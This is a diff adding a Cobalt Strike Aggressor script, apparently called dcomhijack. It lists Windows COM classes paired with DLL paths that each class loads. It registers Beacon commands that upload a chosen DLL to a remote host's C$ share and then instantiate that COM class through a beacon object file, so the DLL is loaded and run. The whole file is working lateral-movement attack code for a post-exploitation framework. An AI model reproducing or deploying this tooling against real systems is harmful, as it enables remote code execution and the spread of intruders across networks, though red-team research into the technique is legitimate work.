@@ -1,0 +1,117 @@
+%OPPORTUNITIES[ "WordPadDocument" ] = @( 
+    '73FDDC80-AEA9-101A-98A7-00AA00374959',
+    'Program Files\\Windows NT\\Accessories\\XmlLite.dll'
+);
+%OPPORTUNITIES[ "ContactReadingPane" ] = @( 
+    '13D3C4B8-B179-4ebb-BF62-F704173E7448',
+    'Program Files\\Common Files\\System\\UxTheme.dll'
+);
+%OPPORTUNITIES[ "UserOOBE" ] = @( 
+    'ca8c87c1-929d-45ba-94db-ef8e6cb346ad',
+    'Windows\\System32\\oobe\\USERENV.dll'
+);
+%OPPORTUNITIES[ "MSDAINITIALIZE" ] = @( 
+    '2206CDB0-19C1-11D1-89E0-00C04FD7A829',
+    'Program Files\\Common Files\\System\\Ole DB\\bcrypt.dll'
+);
+%OPPORTUNITIES[ "ShapeCollector" ] = @( 
+    '1E2D67D6-F596-4640-84F6-CE09D630E983',
+    'Program Files\\Common Files\\Microsoft Shared\\ink\\DUI70.dll'
+);
+%OPPORTUNITIES[ "WBEMUnsecuredApt" ] = @( 
+    '49BD2028-1523-11D1-AD79-00C04FD8FDFF',
+    'Windows\\System32\\wbem\\wbemcomn.dll'
+);
+%OPPORTUNITIES[ "WBEMActiveScript" ] = @( 
+    '266C72E7-62E8-11D1-AD89-00C04FD8FDFF',
+    'Windows\\System32\\wbem\\wbemcomn.dll'
+);
+%OPPORTUNITIES[ "VoiceToastCallback" ] = @( 
+    '265b1075-d22b-41eb-bc97-87568f3e6dab',
+    'Windows\\System32\\WinBioPlugIns\\MFPlat.dll'
+);
+%OPPORTUNITIES[ "AddToWMPList" ] = @( 
+    '45597c98-80f6-4549-84ff-752cf55e2d29',
+    'Program Files (x86)\\Windows Media Player\\ATL.dll'
+);
+%OPPORTUNITIES[ "WMPBurnCD" ] = @( 
+    'cdc32574-7521-4124-90c3-8d5605a34933',
+    'Program Files (x86)\\Windows Media Player\\PROPSYS.dll'
+);
+
+alias upload-dll {
+    $cmd = substr($0, 11); # length of command + 1
+    @args = split(' ', $cmd); 
+    $class = @args[0];
+    $target = @args[1];
+    $dllPath = @args[2];
+
+    if ( $class eq $null || $class eq "" || $target eq $null || $target eq "" ) {
+        berror( $1, "Usage: dcomhijack <class name> <target IP or host> [dll path]" );
+        return;
+    }
+
+    if ( @args[2] eq $null ) {
+        $dllPath = script_resource( split('\\\\', %OPPORTUNITIES[$class][1])[-1] );
+    }
+    
+    $dhfs = openf( $dllPath );
+    $dll = readb( $dhfs, -1 );
+    closef( $dhfs );
+
+    if ( $dll eq $null ) {
+        berror( $1, "Could not read DLL at " . $dllPath );
+        return;
+    }
+
+    $remotePath = '\\\\' . $target . '\\C$\\' . %OPPORTUNITIES[$class][1];
+    bupload_raw( $1, $remotePath, $dll, $dllPath );
+}
+
+alias create-object {
+    $cmd = substr($0, 14); # length of command + 1
+    @args = split(' ', $cmd); 
+    $class = @args[0];
+    $target = @args[1];
+
+    if ( $class eq $null || $target eq $null ) {
+        berror( $1, "Usage: dcomhijack <class name> <target IP or host> [dll path]" );
+        return;
+    }
+
+    $barch = barch( $1 );
+    $dhfs = openf( script_resource( "dcomhijack. $+ $barch $+ .o") );
+    $dhrw = readb( $dhfs, -1 );
+    closef( $dhfs );
+
+    if( $dhrw eq $null || $dhrw eq "" ) {
+        berror( $1, "Could not read DCOM hijack BOF" );
+        return;
+    }
+
+    $task = "Instantiating " . $class . " on " . $target;
+    btask( $1, $task );
+    $argvs = bof_pack( $1, "ZZ", "{".%OPPORTUNITIES[$class][0]."}", $target );
+    beacon_inline_execute( $1, $dhrw, "Go", $argvs );
+}
+
+$classNames = "";
+foreach $class ( %OPPORTUNITIES ) {
+    $classNames = $classNames . "    - " . $class . "\n";
+}
+
+beacon_command_register(
+    "upload-dll",
+    "Uploads the DLL for a hijackable COM class to a target host",
+    "  Usage: upload-dll <class name> <target IP or host> [dll path]\n" .
+    "  Class names:\n" .
+    $classNames,
+);
+
+beacon_command_register(
+    "create-object",
+    "Instantiates a hijackable COM class on a target host",
+    "  Usage: create-object <class name> <target IP or host>\n" .
+    "  Class names:\n" .
+    $classNames,
+);
